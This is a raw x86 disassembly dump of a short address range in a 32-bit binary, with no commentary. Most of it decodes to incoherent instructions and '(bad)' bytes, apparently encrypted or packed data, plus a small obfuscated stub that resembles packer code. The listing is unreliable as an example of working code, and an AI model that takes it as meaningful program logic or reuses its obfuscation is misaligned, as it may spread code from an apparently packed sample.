  40978e:	push   0x5d3dd975
  409793:	jb     0x409792
  409795:	mov    ds:0xa88a68e2,eax
  40979a:	retf   
  40979b:	jbe    0x4097ce
  40979d:	push   0xf5196b69
  4097a2:	jg     0x409817
  4097a4:	rol    dh,cl
  4097a6:	lock mov al,0x5
  4097a9:	pop    ds
  4097aa:	mov    al,0x3a
  4097ac:	push   esp
  4097ad:	jl     0x4097d7
  4097af:	xchg   edx,eax
  4097b0:	ror    bl,0xb0
  4097b3:	popf   
  4097b4:	cld    
  4097b5:	jae    0x4097e8
  4097b7:	jbe    0x409790
  4097b9:	imul   esi,DWORD PTR [ebx-0x1c],0xfffffff9
  4097bd:	pmaddwd mm3,QWORD PTR [edx+edi*2-0x6b]
  4097c2:	daa    
  4097c3:	xor    DWORD PTR ss:[edx+0x6e],ecx
  4097c7:	das    
  4097c8:	popf   
  4097c9:	jecxz  0x4097d1
  4097cb:	je     0x409795
  4097cd:	fild   QWORD PTR [ebp-0x4e8fc52b]
  4097d3:	in     eax,dx
  4097d4:	fst    st(5)
  4097d6:	mov    ah,BYTE PTR [ebx+0x58]
  4097d9:	mov    cl,0x6e
  4097db:	lds    edx,FWORD PTR [edi+0x49]
  4097de:	rcr    DWORD PTR [eax+0x5ffd14d4],1
  4097e4:	int    0x21
  4097e6:	cmp    al,0x9
  4097e8:	mov    dh,0x9
  4097ea:	test   al,0xf9
  4097ec:	mov    cs,WORD PTR [esp+ecx*4+0x1c369387]
  4097f3:	lds    edi,FWORD PTR [edx+0x7b5f009c]
  4097f9:	mov    ah,0xd9
  4097fb:	and    bh,dl
  4097fd:	shr    BYTE PTR [ecx+0x44028a0d],0x94
  409804:	sbb    DWORD PTR [esi-0x37],edi
  409807:	add    ebp,DWORD PTR [edx+0x50]
  40980a:	mov    bl,0xc3
  40980c:	mov    fs,WORD PTR [eax]
  40980e:	div    BYTE PTR [ebp-0x5a]
  409811:	fld    QWORD PTR [ecx]
  409813:	push   ebx
  409814:	arpl   WORD PTR [ebx],di
  409816:	inc    ebx
  409817:	or     ch,BYTE PTR [eax-0x3d1ac10e]
  40981d:	inc    ecx
  40981e:	or     DWORD PTR [edi],ebx
  409820:	xor    edx,DWORD PTR [edx]
  409822:	nop
  409823:	xchg   esp,eax
  409824:	dec    edi
  409825:	loop   0x409869
  409827:	sub    eax,0xa175bd7f
  40982c:	jp     0x409888
  40982e:	cld    
  40982f:	xor    al,0x1d
  409831:	out    dx,al
  409832:	pushf  
  409833:	mov    ebx,0xc31a7810
  409838:	mov    WORD PTR [esi],ss
  40983a:	daa    
  40983b:	xchg   edi,eax
  40983c:	mov    eax,ds:0x658e472c
  409841:	js     0x40988f
  409843:	lock xchg esp,eax
  409845:	adc    al,0xa7
  409847:	mov    dl,0xa4
  409849:	ror    DWORD PTR [ecx],cl
  40984b:	xor    eax,0x74d6c906
  409850:	cmc    
  409851:	sbb    BYTE PTR [edx-0x3a],0x29
  409855:	bndstx [ebx-0x3b],bnd0
  409859:	mov    esp,0xf87834f6
  40985e:	dec    ebp
  40985f:	or     bh,ah
  409861:	jp     0x409850
  409863:	in     al,dx
  409864:	pop    es
  409865:	out    dx,al
  409866:	or     BYTE PTR [eax+0x209a7d1d],ch
  40986c:	xchg   ebx,eax
  40986d:	dec    edx
  40986e:	dec    ecx
  40986f:	in     eax,0xba
  409871:	les    edx,FWORD PTR [esi+0x2cb2b8d7]
  409877:	jmp    0xe950:0x5e23bb29
  40987e:	and    dl,BYTE PTR [ebx]
  409880:	out    0x96,eax
  409882:	dec    ecx
  409883:	ins    DWORD PTR es:[edi],dx
  409884:	cli    
  409885:	xchg   esi,eax
  409886:	pop    ebx
  409887:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409888:	inc    ebp
  409889:	add    DWORD PTR [edx+0x1c],ecx
  40988c:	and    BYTE PTR [edi-0x753d325e],ah
  409892:	int3   
  409893:	xor    edi,DWORD PTR [ebx-0x4b]
  409896:	pop    esp
  409897:	test   al,0x3f
  409899:	sub    DWORD PTR [ecx+0x6020dd96],edi
  40989f:	mov    DWORD PTR [ecx-0x74],eax
  4098a2:	mov    al,0xb1
  4098a4:	xchg   DWORD PTR [ebx-0x2c],esi
  4098a7:	out    0x24,al
  4098a9:	jns    0x4098d8
  4098ab:	stos   BYTE PTR es:[edi],al
  4098ac:	mov    ebx,0x340509a
  4098b1:	imul   eax,DWORD PTR [edx-0x31ed375],0xa15fbe7
  4098bb:	call   0x6306:0x6aedd8d0
  4098c2:	lock pop eax
  4098c4:	dec    esi
  4098c5:	jl     0x4098a5
  4098c7:	fcomp  st(7)
  4098c9:	dec    ebp
  4098ca:	push   ss
  4098cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098cc:	int    0xc5
  4098ce:	ja     0x409863
  4098d0:	shl    DWORD PTR es:[ecx],1
  4098d3:	fcom   DWORD PTR [edx]
  4098d5:	mov    eax,0x57dbdb7d
  4098da:	ss scas al,BYTE PTR es:[edi]
  4098dc:	ret    
  4098dd:	inc    ecx
  4098de:	dec    ebx
  4098df:	mov    bh,0x8
  4098e1:	mov    cl,0x56
  4098e3:	mov    dl,0xd3
  4098e5:	popa   
  4098e6:	add    cl,BYTE PTR [edi+0x29]
  4098e9:	aam    0x77
  4098eb:	lea    ecx,ds:0xa0c56210
  4098f1:	shr    bh,0xa
  4098f4:	je     0x40994f
  4098f6:	xor    ecx,edx
  4098f8:	add    bh,ah
  4098fa:	adc    edi,DWORD PTR [ecx+0x6c146433]
  409900:	dec    esp
  409901:	adc    cl,bh
  409903:	(bad)  
  409904:	cmp    al,0x71
  409906:	cmp    esi,DWORD PTR [ebx+esi*8-0x51]
  40990a:	fdiv   DWORD PTR [edx-0x9f2d70d]
  409910:	sub    al,BYTE PTR [ebx+ecx*4+0x1d]
  409914:	jp     0x4098b8
  409916:	sub    ah,ah
  409918:	adc    eax,0xfa43412e
  40991d:	cmc    
  40991e:	je     0x409959
  409920:	add    ebx,DWORD PTR [ecx]
  409922:	xor    al,0x9
  409924:	inc    ebp
  409925:	push   0x4d
  409927:	rcl    BYTE PTR [ebp+0x66],cl
  40992a:	fsub   DWORD PTR [ebx-0x23a3acc0]
  409930:	mov    edi,0x592c1e44
  409935:	lea    ecx,[eax-0x2d21fa37]
  40993b:	jbe    0x40991a
  40993d:	mov    ds:0xd03ad4ea,al
  409942:	push   0x92527bce
  409947:	sub    al,0x6b
  409949:	push   0x5cecdbec
  40994e:	fcom   DWORD PTR [edi+0x1e]
  409951:	sbb    al,0xd6
  409953:	push   ds
  409954:	cs test al,0x9b
  409957:	jb     0x409931
  409959:	enter  0x1316,0x24
  40995d:	shr    DWORD PTR [edi+0x7cffc582],1
  409963:	pop    ds
  409964:	mov    esp,0xc1c330ec
  409969:	aam    0x23
  40996b:	pop    es
  40996c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40996d:	inc    edx
  40996e:	adc    BYTE PTR [edi],bl
  409970:	inc    ebx
  409971:	xor    eax,0x4fa27c62
  409976:	dec    esi
  409977:	pushf  
  409978:	add    eax,0xc8c1c267
  40997d:	out    dx,al
  40997e:	iret   
  40997f:	fld    TBYTE PTR [eax-0x7a]
  409982:	inc    edx
  409983:	cli    
  409984:	xor    BYTE PTR [edi+edx*1],dh
  409987:	mov    edi,0x8181da03
  40998c:	loopne 0x4099e2
  40998e:	mov    BYTE PTR [ecx+0x7f],bh
  409991:	pop    edx
  409992:	dec    ebx
  409993:	mov    ebp,0x31a6980a
  409998:	and    eax,0x6bad9bf2
  40999d:	mov    dh,0xee
  40999f:	data16 sar al,0x1a
  4099a3:	loopne 0x4099b8
  4099a5:	dec    edx
  4099a6:	and    DWORD PTR [edx],esi
  4099a8:	mov    fs,WORD PTR [ebx-0x1]
  4099ab:	push   ds
  4099ac:	dec    esp
  4099ad:	mov    esi,0x5b399fbf
  4099b2:	push   esi
  4099b3:	xor    eax,0x29eb51f9
  4099b8:	(bad)  
  4099b9:	(bad)  
  4099ba:	pop    eax
  4099bb:	mov    ecx,0x10311641
  4099c0:	mov    esi,0xa9064215
  4099c5:	not    DWORD PTR [edx]
  4099c7:	outs   dx,BYTE PTR ds:[esi]
  4099c8:	jle    0x409a38
  4099ca:	test   eax,0x4226b867
  4099cf:	sub    BYTE PTR [edi-0x27],0x3a
  4099d3:	imul   ebx,DWORD PTR [esi-0x397fb0e8],0xfffffff2
  4099da:	mov    BYTE PTR [edx],ah
  4099dc:	retf   0xfcf2
  4099df:	leave  
  4099e0:	fwait
  4099e1:	and    DWORD PTR es:[edi-0x38],ebx
  4099e5:	xchg   edx,eax
  4099e6:	call   0x58dcc54c
  4099eb:	das    
  4099ec:	dec    esi
  4099ed:	hlt    
  4099ee:	sbb    BYTE PTR [ebp+0x58ae2a47],0x87
  4099f5:	xchg   DWORD PTR [edi-0x1b],esp
  4099f8:	icebp  
  4099f9:	je     0x4099d3
  4099fb:	and    cl,BYTE PTR [ebx+0x26]
  4099fe:	pop    esi
  4099ff:	aas    
  409a00:	icebp  
  409a01:	sbb    al,0x55
  409a03:	and    al,0x8b
  409a05:	out    0x45,al
  409a07:	pop    edi
  409a08:	in     eax,0x97
  409a0a:	test   BYTE PTR [ecx],al
  409a0c:	jecxz  0x409992
  409a0e:	out    0x3,eax
  409a10:	cmp    al,0x98
  409a12:	jae    0x409a62
  409a14:	jecxz  0x40999f
  409a16:	cmovne esp,esp
  409a19:	pop    esi
  409a1a:	cmp    DWORD PTR ds:0xfb1fe35d,0xffffff8c
  409a21:	inc    esi
  409a22:	add    DWORD PTR [eax-0x4fdc77f8],ebp
  409a28:	push   0xffffff97
  409a2a:	xchg   ecx,eax
  409a2b:	mov    eax,ds:0x1e893f6b
  409a30:	rcr    ecx,1
  409a32:	xchg   ebx,eax
  409a33:	jg     0x4099c7
  409a35:	xlat   BYTE PTR ds:[ebx]
  409a36:	out    dx,eax
  409a37:	out    dx,eax
  409a38:	jmp    0x4099c3
  409a3a:	out    dx,al
  409a3b:	sub    DWORD PTR [esi-0x5a],0x2da4ce05
  409a42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a43:	sbb    esp,edi
  409a45:	mov    al,BYTE PTR [esi-0xd]
  409a48:	hlt    
  409a49:	add    esp,ecx
  409a4b:	cs mov dh,0x85
  409a4e:	in     al,0xc9
  409a50:	cs sahf 
  409a52:	inc    ebx
  409a53:	hlt    
  409a54:	sub    eax,0x5c29813b
  409a59:	lods   eax,DWORD PTR ds:[esi]
  409a5a:	inc    esp
  409a5b:	(bad)  
  409a5c:	into   
  409a5d:	icebp  
  409a5e:	mov    esp,0xbaca9019
  409a63:	adc    edi,DWORD PTR [ebx+0x67]
  409a66:	jp     0x409a15
  409a68:	inc    esp
  409a69:	push   edx
  409a6a:	pop    ss
  409a6b:	pop    ecx
  409a6c:	adc    DWORD PTR [ebp+0x21538b37],eax
  409a72:	jno    0x409a75
  409a74:	(bad)  
  409a76:	and    DWORD PTR [edi],edi
  409a78:	out    dx,al
  409a79:	loopne 0x409a96
  409a7b:	test   al,0x98
  409a7d:	arpl   WORD PTR [esi-0x68],dx
  409a80:	xchg   edx,eax
  409a81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a82:	mov    BYTE PTR es:[ecx-0x4e580006],al
  409a89:	add    bh,BYTE PTR [eax-0x526d51fd]
  409a8f:	sbb    eax,0x7a6b262b
  409a94:	shl    BYTE PTR [esi+0x3c],1
  409a97:	xchg   ebx,eax
  409a98:	sbb    eax,0x73beb90
  409a9d:	outs   dx,BYTE PTR ds:[esi]
  409a9e:	call   0xc205:0xcc28634d
  409aa5:	loop   0x409ad1
  409aa7:	(bad)  
  409aa9:	call   0x346c157c
  409aae:	nop
  409aaf:	lods   al,BYTE PTR ds:[esi]
  409ab0:	xchg   ebx,eax
  409ab1:	jns    0x409ad0
  409ab3:	aas    
  409ab4:	cs out dx,eax
  409ab6:	fnstcw WORD PTR [esi+0x56]
  409ab9:	mov    ecx,DWORD PTR ds:0x422008
  409abf:	add    ecx,DWORD PTR ds:0x420e82
  409ac5:	mov    DWORD PTR ds:0x422008,ecx
  409acb:	mov    esi,0xf89c85b5
  409ad0:	mov    DWORD PTR [ebp-0xc],esi
  409ad3:	mov    edx,DWORD PTR ds:0x420f34
  409ad9:	mov    ecx,DWORD PTR ds:0x42301c
  409adf:	sub    ecx,edx
  409ae1:	sub    edx,DWORD PTR [edx+ecx*1]
  409ae4:	lea    eax,[ebp-0xc]
  409ae7:	or     ecx,edx
  409ae9:	mov    DWORD PTR [ebp-0x14],eax
  409aec:	mov    eax,DWORD PTR [ebp-0xc]
  409aef:	mov    edx,DWORD PTR [ebp-0x14]
  409af2:	sbb    DWORD PTR ds:0x420fa0,ebx
  409af8:	mov    ecx,0x7510896
  409afd:	xor    eax,ecx
  409aff:	add    eax,0x3272dd
  409b04:	mov    DWORD PTR [edx],eax
  409b06:	mov    edx,DWORD PTR ds:0x42201c
  409b0c:	sbb    DWORD PTR ds:0x420ef0,edx
  409b12:	mov    eax,ds:0x4242ad
  409b17:	mov    edx,DWORD PTR [ebp-0x4]
  409b1a:	sbb    DWORD PTR ds:0x420fac,0x420e82
  409b24:	mov    eax,DWORD PTR [eax]
  409b26:	or     DWORD PTR ds:0x420f08,0x422000
  409b30:	add    eax,DWORD PTR [edx]
  409b32:	push   edi
  409b33:	mov    DWORD PTR [ebp-0x8],eax
  409b36:	jmp    0x40beb0
  409b3b:	popa   
  409b3c:	dec    edi
  409b3d:	jmp    0x409b64
  409b3f:	mov    ebx,0xf1fba379
  409b44:	jnp    0x409bbc
  409b46:	js     0x409b92
  409b48:	std    
  409b49:	sub    DWORD PTR [ebx+0x39],esp
  409b4c:	add    al,0x7a
  409b4e:	jp     0x409b69
  409b50:	pop    edi
  409b51:	jp     0x409bcd
  409b53:	jb     0x409b2e
  409b55:	push   ds
  409b56:	mov    eax,0xa691c34d
  409b5b:	test   eax,0xeb0036fe
  409b60:	adc    ebp,edx
  409b62:	int3   
  409b63:	xchg   esp,eax
  409b64:	fcmovnb st,st(3)
  409b66:	test   BYTE PTR [ecx+0x52],dh
  409b69:	(bad)  
  409b6b:	outs   dx,BYTE PTR gs:[esi]
  409b6d:	(bad)  
  409b6e:	or     BYTE PTR [esi+0x7e],dl
  409b71:	in     eax,0xef
  409b73:	jecxz  0x409af9
  409b75:	sub    eax,0xe578c315
  409b7a:	or     al,0x82
  409b7c:	dec    esp
  409b7d:	dec    esp
  409b7e:	clc    
  409b7f:	jbe    0x409b27
  409b81:	mov    ecx,ecx
  409b83:	int    0x5b
  409b85:	into   
  409b86:	addr16 daa 
  409b88:	icebp  
  409b89:	inc    esi
  409b8a:	sbb    al,0xa4
  409b8c:	into   
  409b8d:	jbe    0x409b89
  409b8f:	iret   
  409b90:	and    BYTE PTR [edi+edx*8-0xbee96b9],bl
  409b97:	jp     0x409be0
  409b99:	retf   0xd620
  409b9c:	mov    edx,DWORD PTR [edi]
  409b9e:	sbb    BYTE PTR [esp+eax*8],bh
  409ba1:	enter  0x4bff,0xf1
  409ba5:	xor    dl,BYTE PTR [eax-0x62]
  409ba8:	stos   BYTE PTR es:[edi],al
  409ba9:	stc    
  409baa:	sbb    eax,0x288f1f46
  409baf:	pop    esi
  409bb0:	std    
  409bb1:	adc    ecx,edi
  409bb3:	pop    eax
  409bb4:	mov    bh,0x49
  409bb6:	mov    bh,0xd5
  409bb8:	adc    DWORD PTR [edi],edx
  409bba:	xor    dl,BYTE PTR [esi]
  409bbc:	sti    
  409bbd:	sub    dl,BYTE PTR [edx+eiz*1]
  409bc0:	ins    DWORD PTR es:[edi],dx
  409bc1:	fs (bad) 
  409bc3:	fld    st(0)
  409bc5:	mov    esp,0xa40407d9
  409bca:	popf   
  409bcb:	les    ebx,FWORD PTR [edi+eiz*4]
  409bce:	pop    ds
  409bcf:	jb     0x409c19
  409bd1:	repz add eax,0xd692902e
  409bd7:	sub    BYTE PTR [eax],bh
  409bd9:	test   BYTE PTR [eax],0x53
  409bdc:	scas   al,BYTE PTR es:[edi]
  409bdd:	adc    BYTE PTR [esi],0x18
  409be0:	scas   eax,DWORD PTR es:[edi]
  409be1:	nop
  409be2:	arpl   WORD PTR [ebp-0x55df78ad],cx
  409be8:	cmp    BYTE PTR [eax+0x50],al
  409beb:	push   0xd1d542c3
  409bf0:	xchg   edi,eax
  409bf1:	cmp    eax,0x7ea6ab9d
  409bf6:	(bad)  
  409bf7:	clc    
  409bf8:	cmp    al,0x9c
  409bfa:	inc    ecx
  409bfb:	inc    ebp
  409bfc:	sti    
  409bfd:	push   cs
  409bfe:	outs   dx,DWORD PTR ds:[esi]
  409bff:	push   ss
  409c00:	mov    al,ds:0x651fafb2
  409c05:	cdq    
  409c06:	dec    esp
  409c07:	mov    esp,0x9956af96
  409c0c:	sub    al,0xc5
  409c0e:	mov    esi,0x7a4c9832
  409c13:	add    eax,0xbd0a1af0
  409c18:	add    DWORD PTR [ecx+ebx*8+0x6714a3d4],0xacc38346
  409c23:	dec    ebp
  409c24:	jecxz  0x409bb3
  409c26:	xchg   DWORD PTR [edi+0x33fb997e],edx
  409c2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c2d:	stos   DWORD PTR es:[edi],eax
  409c2e:	mov    edx,0x129ca45a
  409c33:	(bad)  
  409c34:	leave  
  409c35:	fidiv  WORD PTR [eax]
  409c37:	loop   0x409c01
  409c39:	retf   
  409c3a:	pop    ds
  409c3b:	mov    esp,0xacc36970
  409c40:	sbb    dh,BYTE PTR [ebp-0x253004fd]
  409c46:	outs   dx,DWORD PTR ds:[esi]
  409c47:	and    ah,0xd7
  409c4a:	into   
  409c4b:	xor    edi,ecx
  409c4d:	lods   eax,DWORD PTR ds:[esi]
  409c4e:	stos   DWORD PTR es:[edi],eax
  409c4f:	in     al,dx
  409c50:	xchg   ecx,eax
  409c51:	(bad)  
  409c53:	or     bh,BYTE PTR [eax-0x77]
  409c56:	std    
  409c57:	aaa    
  409c58:	jno    0x409c8b
  409c5a:	or     al,0xaf
  409c5c:	cdq    
  409c5d:	(bad)  
  409c5e:	cwde   
  409c5f:	hlt    
  409c60:	nop
  409c61:	test   eax,0xfa554ab4
  409c67:	and    al,0x34
  409c69:	xor    al,0xab
  409c6b:	fidiv  WORD PTR [ebx+0x74]
  409c6e:	add    ah,BYTE PTR [esi+ecx*4-0x30]
  409c72:	div    BYTE PTR ds:0xce372af6
  409c78:	sub    bh,BYTE PTR [ebp-0x76]
  409c7b:	loope  0x409cfb
  409c7d:	ins    BYTE PTR es:[edi],dx
  409c7e:	sub    BYTE PTR [esi+0x6f],0x48
  409c82:	popf   
  409c83:	xchg   ecx,eax
  409c84:	sub    edi,DWORD PTR [edi-0x5d6a75c4]
  409c8a:	push   ebx
  409c8b:	adc    edi,DWORD PTR [ebx+0x15]
  409c8e:	or     eax,0x13c6e8f3
  409c93:	popa   
  409c94:	pop    esp
  409c95:	aas    
  409c96:	gs jbe 0x409cce
  409c99:	dec    eax
  409c9a:	jno    0x409cd6
  409c9c:	dec    eax
  409c9d:	sub    eax,0x224cc364
  409ca2:	cld    
  409ca3:	addr16 aam 0x95
  409ca6:	xlat   BYTE PTR ds:[ebx]
  409ca7:	fmul   DWORD PTR [ecx+eax*1+0x4bbda5fa]
  409cae:	xor    DWORD PTR [esi+ebp*4+0x33e7b23f],esi
  409cb5:	test   eax,0xe596d318
  409cba:	fisttp DWORD PTR gs:[eax+eax*8+0x7a]
  409cbf:	xchg   ebx,eax
  409cc0:	into   
  409cc1:	repz int 0x4c
  409cc4:	into   
  409cc5:	sub    ecx,DWORD PTR [edi]
  409cc7:	aam    0x87
  409cc9:	mov    esi,0x85f8d50c
  409cce:	pusha  
  409ccf:	nop
  409cd0:	mov    ecx,0xe36493a4
  409cd5:	sub    eax,0x4bca2dbe
  409cda:	mov    dh,0x77
  409cdc:	test   eax,0x92476dd0
  409ce1:	push   ecx
  409ce2:	scas   eax,DWORD PTR es:[edi]
  409ce3:	push   edi
  409ce4:	add    ecx,DWORD PTR [edi+eax*8+0x3852c0ba]
  409ceb:	arpl   WORD PTR [edi-0x8],cx
  409cee:	pop    edx
  409cef:	popa   
  409cf0:	cmp    ch,BYTE PTR [ebx]
  409cf2:	and    edi,DWORD PTR [esi-0x52]
  409cf5:	daa    
  409cf6:	cmp    DWORD PTR [edx+0x15074034],ebx
  409cfc:	push   es
  409cfd:	imul   ebp,edi,0xffffffe9
  409d00:	jp     0x409c8e
  409d02:	jnp    0x409d2a
  409d04:	add    esp,esi
  409d06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d07:	js     0x409cb3
  409d09:	test   eax,0x547cd416
  409d0e:	mov    ecx,0x58a4bd25
  409d13:	fcmovb st,st(2)
  409d15:	cli    
  409d16:	mov    ah,0xc4
  409d18:	jmp    0x409cb4
  409d1a:	rcr    DWORD PTR [edx+0x492667d7],1
  409d20:	icebp  
  409d21:	out    dx,eax
  409d22:	outs   dx,BYTE PTR ds:[esi]
  409d23:	sbb    bh,bh
  409d25:	push   ds
  409d26:	inc    ebp
  409d27:	stos   DWORD PTR es:[edi],eax
  409d28:	push   ebp
  409d29:	lods   eax,DWORD PTR ds:[esi]
  409d2a:	es xchg esi,eax
  409d2c:	push   ds
  409d2d:	inc    eax
  409d2e:	jne    0x409d9b
  409d30:	sbb    eax,0x367c574e
  409d35:	dec    ecx
  409d36:	mov    dh,0x74
  409d38:	dec    ebp
  409d39:	lods   al,BYTE PTR ds:[esi]
  409d3a:	mov    al,0x4
  409d3c:	push   0xffffffc2
  409d3e:	sub    DWORD PTR [esi+0x7c],esp
  409d41:	adc    al,BYTE PTR [ebx]
  409d43:	stos   DWORD PTR es:[edi],eax
  409d44:	leave  
  409d45:	pop    edi
  409d46:	sub    DWORD PTR [ecx+0x7c81787e],edi
  409d4c:	xchg   esp,eax
  409d4d:	mov    ah,0x48
  409d4f:	mov    ah,0x97
  409d51:	(bad)  
  409d53:	mov    ebx,DWORD PTR [di-0x4e]
  409d57:	jne    0x409dd3
  409d59:	ret    
  409d5a:	mov    al,0x95
  409d5c:	stos   BYTE PTR es:[edi],al
  409d5d:	aad    0x7b
  409d5f:	stos   BYTE PTR es:[edi],al
  409d60:	pop    eax
  409d61:	(bad)  
  409d62:	mov    edx,0x249ddded
  409d67:	aas    
  409d68:	pop    es
  409d69:	jmp    0x409d32
  409d6b:	pop    ecx
  409d6c:	clc    
  409d6d:	lea    esi,[eax+0x5e]
  409d70:	push   eax
  409d71:	mov    esp,ebp
  409d73:	mov    dh,BYTE PTR [edx-0x68]
  409d76:	std    
  409d77:	les    edx,FWORD PTR [eax-0x3e82cb42]
  409d7d:	ss push es
  409d7f:	add    eax,0x50e038cc
  409d84:	jae    0x409d19
  409d86:	inc    ebx
  409d87:	fisttp DWORD PTR [ebx]
  409d89:	shl    BYTE PTR [esi-0x3c],cl
  409d8c:	and    BYTE PTR [ebx-0x5167cb9b],0xf9
  409d93:	jne    0x409df0
  409d95:	pop    esi
  409d96:	fnstsw WORD PTR [ecx]
  409d98:	in     eax,dx
  409d99:	rol    BYTE PTR [edi+0xe],cl
  409d9c:	jno    0x409db6
  409d9e:	mov    cs,ebx
  409da0:	jmp    0xda5:0xdbb3731c
  409da7:	inc    ebx
  409da8:	ins    BYTE PTR es:[edi],dx
  409da9:	cdq    
  409daa:	loopne 0x409d43
  409dac:	jg     0x409d4c
  409dae:	test   al,0xe7
  409db0:	in     al,0xd2
  409db2:	ret    
  409db3:	hlt    
  409db4:	test   eax,0x8079a60f
  409db9:	lahf   
  409dba:	aad    0xe4
  409dbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409dbd:	gs (bad) 
  409dbf:	pop    edi
  409dc0:	jno    0x409dff
  409dc2:	leave  
  409dc3:	popa   
  409dc4:	clc    
  409dc5:	in     eax,0x5e
  409dc7:	pop    edx
  409dc8:	test   eax,0xa49401f8
  409dcd:	lahf   
  409dce:	add    BYTE PTR [edi+0x25],bl
  409dd1:	dec    eax
  409dd2:	mov    dh,BYTE PTR [edi]
  409dd4:	loop   0x409e55
  409dd6:	repz sbb eax,0x1386f7f4
  409ddc:	jp     0x409d98
  409dde:	cdq    
  409ddf:	pop    ebp
  409de0:	inc    ecx
  409de1:	mov    eax,ds:0x95d04222
  409de6:	test   eax,0xb070726b
  409deb:	cmp    al,0x62
  409ded:	clc    
  409dee:	dec    ebp
  409def:	push   ebx
  409df0:	pop    esi
  409df1:	aaa    
  409df2:	loopne 0x409d78
  409df4:	lods   al,BYTE PTR ds:[esi]
  409df5:	lods   al,BYTE PTR ds:[esi]
  409df6:	imul   edx,DWORD PTR [edx-0xa],0x63
  409dfa:	and    esi,DWORD PTR [edx-0x50]
  409dfd:	push   ss
  409dfe:	jae    0x409e50
  409e00:	stos   BYTE PTR es:[edi],al
  409e01:	inc    edi
  409e02:	rol    cl,0x77
  409e05:	jmp    0xd3b0:0x425a6f1d
  409e0c:	jb     0x409e3b
  409e0e:	or     eax,0xd65235fd
  409e13:	lds    edi,FWORD PTR [esi-0x3d248e20]
  409e19:	mov    cl,0x8d
  409e1c:	sahf   
  409e1d:	mov    ebx,0x76fdc241
  409e22:	push   0x37
  409e24:	mov    eax,0x4ad644ff
  409e29:	dec    ebp
  409e2a:	sbb    BYTE PTR [ecx-0x1802670],bh
  409e30:	sub    DWORD PTR [ecx-0xd],esi
  409e33:	jae    0x409e07
  409e35:	push   esi
  409e36:	push   ds
  409e37:	arpl   WORD PTR [ebp-0x3a],bp
  409e3a:	pop    ds
  409e3b:	xor    ebx,0x48
  409e3e:	add    dh,BYTE PTR [ebp+0x38]
  409e41:	mov    dl,0x26
  409e43:	(bad)  
  409e44:	ins    DWORD PTR es:[edi],dx
  409e45:	cmc    
  409e46:	cmp    al,0x35
  409e48:	xchg   esi,eax
  409e49:	loope  0x409e0b
  409e4b:	js     0x409ea3
  409e4d:	pop    edi
  409e4e:	and    edx,DWORD PTR [esi-0x40]
  409e51:	fisttp QWORD PTR [ecx-0x375d1e]
  409e57:	add    al,0x66
  409e59:	fstp   TBYTE PTR [eax-0x3c]
  409e5c:	idiv   BYTE PTR [edx-0x6a]
  409e5f:	das    
  409e60:	aas    
  409e61:	lds    ebp,FWORD PTR [esi-0x2f64f70e]
  409e67:	mov    WORD PTR fs:[eax],cs
  409e6a:	jno    0x409ec4
  409e6c:	and    BYTE PTR [esi+0x337a37b2],bh
  409e72:	(bad)  
  409e73:	out    dx,eax
  409e74:	mov    WORD PTR [edi+0x2],fs
  409e77:	inc    esi
  409e78:	push   ebp
  409e79:	mov    bh,0xd0
  409e7b:	add    eax,0x78cb78cf
  409e80:	push   DWORD PTR [esi-0x56fb266]
  409e86:	es jnp 0x409ea3
  409e89:	add    al,dl
  409e8b:	(bad)  
  409e8c:	pop    ebp
  409e8d:	push   cs
  409e8e:	add    esp,edi
  409e90:	in     eax,dx
  409e91:	stos   BYTE PTR es:[edi],al
  409e92:	dec    ebx
  409e93:	sub    DWORD PTR [edi],ebp
  409e95:	mov    ds:0x513812d6,eax
  409e9a:	push   ds
  409e9b:	sbb    BYTE PTR [ecx+0x6f],bh
  409e9e:	cwde   
  409e9f:	jae    0x409e61
  409ea1:	pop    ecx
  409ea2:	jmp    0x409e48
  409ea4:	sbb    BYTE PTR [edi+0x79d02b3d],bh
  409eaa:	push   ebp
  409eab:	bound  esi,QWORD PTR [ecx+0x7484f069]
  409eb1:	add    DWORD PTR [edx],edx
  409eb3:	cdq    
  409eb4:	sub    DWORD PTR [ecx],0x4076fbfe
  409eba:	jne    0x409e6a
  409ebc:	push   edx
  409ebd:	jmp    0x8a62:0x37b89e0c
  409ec4:	shl    BYTE PTR [esi],0x4b
  409ec7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ec8:	das    
  409ec9:	sar    eax,0x86
  409ecc:	inc    ebx
  409ecd:	loope  0x409e77
  409ecf:	jo     0x409f22
  409ed1:	xor    eax,0xf01e72f4
  409ed6:	es mov edx,0xe84aa7d8
  409edc:	jl     0x409e6f
  409ede:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  409ee0:	sbb    eax,0xbc2629b5
  409ee5:	fld    DWORD PTR [ecx+0x21]
  409ee8:	pop    ds
  409ee9:	jns    0x409f42
  409eeb:	nop
  409eec:	scas   al,BYTE PTR es:[edi]
  409eed:	add    dl,bl
  409eef:	or     BYTE PTR [ebx+0x42],bl
  409ef2:	dec    ecx
  409ef3:	fild   WORD PTR [ebx-0x2]
  409ef6:	dec    eax
  409ef7:	push   ebp
  409ef9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409efa:	bnd jg 0x409eda
  409efd:	or     DWORD PTR [esi+eax*2-0x989f4f4],0x44116794
  409f08:	call   0x4f59d1e9
  409f0d:	inc    ebx
  409f0e:	jl     0x409f0b
  409f10:	push   ebx
  409f11:	xor    eax,0x4eff2036
  409f16:	lods   eax,DWORD PTR ds:[esi]
  409f17:	les    edi,FWORD PTR [ecx+0x384eda2f]
  409f1d:	dec    esp
  409f1e:	xlat   BYTE PTR ds:[ebx]
  409f1f:	xchg   BYTE PTR [edi+0xa2e8014],cl
  409f25:	push   ecx
  409f26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f27:	ja     0x409f10
  409f29:	scas   eax,DWORD PTR es:[edi]
  409f2a:	inc    esi
  409f2b:	push   cs
  409f2c:	or     BYTE PTR [esi+ecx*4+0x1f],0xde
  409f31:	bswap  ebx
  409f33:	xchg   esi,eax
  409f34:	cmp    DWORD PTR [esi-0x18bd0636],eax
  409f3a:	(bad)  
